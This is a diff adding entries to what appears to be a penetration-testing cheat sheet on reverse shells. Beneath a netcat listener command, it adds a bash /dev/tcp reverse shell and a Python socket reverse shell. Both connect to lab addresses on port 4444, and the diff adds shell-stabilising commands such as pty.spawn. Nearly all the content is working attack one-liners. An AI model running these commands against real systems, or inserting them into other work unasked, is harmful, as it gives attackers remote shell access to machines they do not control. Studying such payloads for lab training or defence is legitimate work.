@@ -37,7 +37,20 @@ https://www.tldp.org/LDP/abs/html/io-redirection.html
 Start a listener using netcat:
 nc -nlvp 4444
 
+Here is a bash reverse shell opening 192.168.56.101 with port 4444
 bash -i >& /dev/tcp/192.168.56.101/4444 0>&1
+
+Here is a python opening 192.168.56.102 with port 4444
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+## TTY Shells
+In order to get a fully functional shell, try one of these...
+/bin/sh -i
+/bin/bash -i
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+
 
 
 
